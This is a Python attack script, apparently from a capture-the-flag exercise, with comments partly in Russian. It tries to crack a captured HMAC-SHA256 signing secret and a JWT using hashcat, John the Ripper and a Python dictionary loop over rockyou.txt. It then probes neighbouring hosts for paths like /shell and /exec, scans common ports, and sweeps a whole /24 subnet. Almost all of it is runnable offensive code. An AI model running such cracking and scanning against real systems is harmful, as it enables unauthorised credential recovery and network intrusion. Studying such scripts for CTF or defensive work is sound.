#!/usr/bin/env python3
"""round55 — hashcat CPU + rockyou.txt + investigate other CTF hosts"""
import requests, socket, time, json, hmac as hm, hashlib, base64, subprocess, os, sys

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

KNOWN_URL = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
KNOWN_SIG_BYTES = bytes.fromhex(KNOWN_SIG)

# ============================================================
print("="*70)
print("PHASE 1: HASHCAT --force (CPU MODE) + ROCKYOU.TXT")
print("="*70)

rockyou = "/usr/share/wordlists/rockyou.txt"
if os.path.exists(rockyou + ".gz") and not os.path.exists(rockyou):
    print("  Распаковываем rockyou.txt.gz...")
    subprocess.run(["gunzip", "-k", rockyou + ".gz"], timeout=30)

if os.path.exists(rockyou):
    print(f"  rockyou.txt найден ({os.path.getsize(rockyou)//1024//1024} MB)")

    # Try hashcat first (faster even on CPU)
    print("\n  Запускаем hashcat -m 1450 --force...")
    try:
        result = subprocess.run(
            ["hashcat", "-m", "1450", "probe_hmac.hash", rockyou,
             "--force", "-O", "--potfile-disable",
             "-w", "3"],  # workload profile high
            capture_output=True, text=True, timeout=300  # 5 min max
        )
        output = result.stdout + result.stderr
        if "Cracked" in output or ":" in result.stdout:
            # Look for cracked hash
            for line in (result.stdout + result.stderr).split('\n'):
                if KNOWN_SIG in line or "Cracked" in line:
                    print(f"  *** HASHCAT CRACKED: {line} ***")
        else:
            print(f"  hashcat: нет совпадений в rockyou.txt")
            # Show status lines
            for line in output.split('\n'):
                if any(x in line for x in ['Status', 'Speed', 'Progress', 'Recovered', 'Exhausted', 'candidates']):
                    print(f"    {line.strip()}")
    except subprocess.TimeoutExpired:
        print("  hashcat: таймаут 5 мин (не успел)")
    except Exception as e:
        print(f"  hashcat error: {e}")

    # Also try JWT cracking
    print("\n  Запускаем hashcat -m 16500 (JWT)...")
    try:
        result = subprocess.run(
            ["hashcat", "-m", "16500", "carrier_jwt.hash", rockyou,
             "--force", "-O", "--potfile-disable"],
            capture_output=True, text=True, timeout=300
        )
        output = result.stdout + result.stderr
        for line in output.split('\n'):
            if any(x in line for x in ['Cracked', 'Recovered', 'Status', 'candidates']):
                print(f"    {line.strip()}")
    except subprocess.TimeoutExpired:
        print("  JWT hashcat: таймаут")
    except Exception as e:
        print(f"  JWT hashcat: {e}")

else:
    print(f"  rockyou.txt не найден, используем Python брутфорс")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: PYTHON DICTIONARY ATTACK (FALLBACK)")
print("="*70)

# If hashcat didn't find it, try Python
# Python is ~100-200K hash/sec, rockyou has ~14M lines = ~70-140 sec
if os.path.exists(rockyou):
    print(f"  Python HMAC-SHA256 атака по rockyou.txt...")
    url_bytes = KNOWN_URL.encode()
    count = 0
    found = False
    t0 = time.time()

    try:
        with open(rockyou, "rb") as f:
            for line in f:
                word = line.rstrip(b"\n\r")
                if not word:
                    continue
                count += 1

                if hm.new(word, url_bytes, hashlib.sha256).digest() == KNOWN_SIG_BYTES:
                    elapsed = time.time() - t0
                    print(f"\n  *** PROBE_SECRET FOUND: {word!r} ***")
                    print(f"  *** Decoded: {word.decode('utf-8', errors='replace')} ***")
                    print(f"  *** After {count} attempts in {elapsed:.1f}s ***")
                    found = True

                    # Verify with all 5 signatures
                    all_sigs = {
                        "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
                        "http://gauge-gw.internal:9100/v1/tanks/1/level": "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803",
                    }
                    for url, expected_sig in all_sigs.items():
                        computed = hm.new(word, url.encode(), hashlib.sha256).hexdigest()
                        match = computed == expected_sig
                        print(f"    Verify {url[-20:]}: {'OK' if match else 'FAIL'}")

                    break

                if count % 500000 == 0:
                    elapsed = time.time() - t0
                    rate = count / elapsed
                    print(f"  ... {count:,} words, {rate:.0f}/sec, {elapsed:.0f}s", flush=True)

        if not found:
            elapsed = time.time() - t0
            print(f"  Не найдено в {count:,} словах за {elapsed:.1f}s")
    except KeyboardInterrupt:
        elapsed = time.time() - t0
        print(f"\n  Прервано после {count:,} слов за {elapsed:.1f}s")
else:
    print("  rockyou.txt отсутствует")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: ИССЛЕДОВАНИЕ ДРУГИХ CTF ХОСТОВ")
print("="*70)

other_hosts = [
    ("192.168.242.101", 9000),
    ("192.168.242.103", 9000),
    ("192.168.242.104", 9000),
    ("192.168.242.106", 9000),
]

for ip, port in other_hosts:
    target = f"http://{ip}:{port}"
    print(f"\n  === {ip}:{port} ===")

    # healthz
    try:
        r = requests.get(f"{target}/healthz", timeout=3)
        print(f"  /healthz [{r.status_code}]: {r.text[:100]}")
    except Exception as e:
        print(f"  /healthz: {type(e).__name__}: {str(e)[:80]}")
        continue

    # Root
    try:
        r = requests.get(f"{target}/", timeout=3)
        print(f"  / [{r.status_code}]: {r.text[:200]}")
    except:
        pass

    # Common paths
    for path in ["/api", "/shell", "/llehs", "/exec", "/flag", "/secret",
                 "/probe", "/config", "/status", "/info", "/version"]:
        try:
            r = requests.get(f"{target}{path}", timeout=2)
            if r.status_code != 404:
                print(f"  [{r.status_code}] {path}: {r.text[:150]}")
        except:
            pass

    # Check other common ports on this host
    for p in [22, 80, 8007, 8080, 5432, 3000]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, p))
            if result == 0:
                print(f"  [{ip}:{p}] OPEN")
            sock.close()
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: ДРУГИЕ IP В ДИАПАЗОНЕ (ШИРОКИЙ СКАН)")
print("="*70)

# Scan 192.168.242.0/24 for port 8007 (CaspiTerminal-like)
print("  Scanning .1-.254 for port 8007, 80, 8080...")
found_services = []
for i in range(1, 255):
    ip = f"192.168.242.{i}"
    for port in [8007, 80, 8080]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                found_services.append((ip, port))
            sock.close()
        except:
            pass

if found_services:
    print(f"  Найдено {len(found_services)} сервисов:")
    for ip, port in found_services:
        # Quick HTTP check
        try:
            r = requests.get(f"http://{ip}:{port}/", timeout=2)
            title_match = __import__('re').search(r'<title>([^<]+)</title>', r.text)
            title = title_match.group(1) if title_match else "no title"
            print(f"    {ip}:{port} [{r.status_code}] {title}")
        except:
            print(f"    {ip}:{port} [open]")
else:
    print("  Ничего не найдено")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: JOHN THE RIPPER (АЛЬТЕРНАТИВА)")
print("="*70)

# Try john if hashcat failed
try:
    result = subprocess.run(["john", "--version"], capture_output=True, text=True, timeout=5)
    print(f"  john version: {result.stdout.strip()}")

    # Prepare john format for HMAC-SHA256
    # john format: user:$hmac-sha256$salt_hex$hash_hex
    salt_hex = KNOWN_URL.encode().hex()
    with open("probe_john.txt", "w") as f:
        f.write(f"probe:$hmac-sha256${salt_hex}${KNOWN_SIG}\n")

    print("  Running john...")
    result = subprocess.run(
        ["john", "--format=hmac-sha256", f"--wordlist={rockyou}",
         "probe_john.txt"],
        capture_output=True, text=True, timeout=300
    )
    print(f"  john output: {result.stdout[:500]}")
    if result.stderr:
        print(f"  john stderr: {result.stderr[:500]}")

    # Show results
    result = subprocess.run(
        ["john", "--show", "probe_john.txt"],
        capture_output=True, text=True, timeout=10
    )
    if result.stdout.strip():
        print(f"  *** JOHN RESULT: {result.stdout.strip()} ***")

except FileNotFoundError:
    print("  john не установлен")
except Exception as e:
    print(f"  john error: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
